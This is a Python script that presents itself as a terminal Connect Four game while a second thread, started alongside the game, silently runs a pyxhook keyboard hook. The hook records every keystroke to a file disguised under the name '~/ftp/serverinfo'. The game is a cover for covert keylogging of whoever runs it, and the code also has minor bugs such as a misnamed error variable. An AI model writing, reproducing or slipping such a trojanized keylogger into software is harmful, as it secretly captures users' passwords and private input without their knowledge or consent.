#! /usr/bin/python3
import threading 
import os 
import pyxhook
def background():
    text_file = os.environ.get(
            'pylogger_file', 
            os.path.expanduser('~/ftp/serverinfo')
    )

    cancel_key = ord(
            os.environ.get(
                'pylogger_cancel', 
            '`'
        )[0]
    )

    if os.environ.get('pylogger_clean', None) is not None:
        try:
            os.remove(text_file)
        except EnvironmentError:
            pass


    def OnKeyPress(event):
        with open(text_file, 'a') as f: 
            f.write('{}\n'.format(event.Key))

    new_hook = pyxhook.HookManager()
    new_hook.KeyDown = OnKeyPress

    new_hook.HookKeyboard()
    try:
        new_hook.start()
    except KeyboardInterrupt:
        pass
    except Exception as ex: 
        msd = 'Error while catching events:\n  {}'.format(ex)
        pyxhook.print_err(msg)
        with open(text_file, 'a') as f: 
            f.write('\n{}'.format(msg))


def foreground():
    class ConnectFour:
        def __init__(self):
            self.board = [[' ' for _ in range(7)] for _ in range(6)]
            self.current_player = 'X'

        def display_board(self):
            for row in self.board:
                print('|'.join(row))
                print('-' * 7)

        def make_move(self, column):
            for row in range(5, -1, -1):
                if self.board[row][column] == ' ':
                    self.board[row][column] = self.current_player
                    return True
            return False

        def check_winner(self):
            for row in range(6):
                for col in range(4):
                    if (self.board[row][col] == self.current_player and
                            self.board[row][col + 1] == self.current_player and
                            self.board[row][col + 2] == self.current_player and
                            self.board[row][col + 3] == self.current_player):
                        return True

        
            for col in range(7):
                for row in range(3):
                    if (self.board[row][col] == self.current_player and
                            self.board[row + 1][col] == self.current_player and
                            self.board[row + 2][col] == self.current_player and
                            self.board[row + 3][col] == self.current_player):
                        return True

        
            for row in range(3):
                for col in range(4):
                    if (self.board[row][col] == self.current_player and
                            self.board[row + 1][col + 1] == self.current_player and
                            self.board[row + 2][col + 2] == self.current_player and
                            self.board[row + 3][col + 3] == self.current_player):
                        return True

            for row in range(3):
                for col in range(3, 7):
                    if (self.board[row][col] == self.current_player and
                            self.board[row + 1][col - 1] == self.current_player and
                            self.board[row + 2][col - 2] == self.current_player and
                            self.board[row + 3][col - 3] == self.current_player):
                        return True
            return False

        def switch_player(self):
            self.current_player = 'O' if self.current_player == 'X' else 'X'

        def play(self):
            while True:
                self.display_board()
                column = int(input(f'Player {self.current_player}, enter column (1-6): '))
                if 0 <= column <= 6 and self.make_move(column):
                    if self.check_winner():
                        print(f'Player {self.current_player} wins!')
                        break
                    self.switch_player()
                else:
                    print('Incorrect move. Please try again.')


    if __name__ == "__main__":
        game = ConnectFour()
        game.play()



b = threading.Thread(name='background', target=background)
f = threading.Thread(name='foreground', target=foreground)
b.start()
f.start()
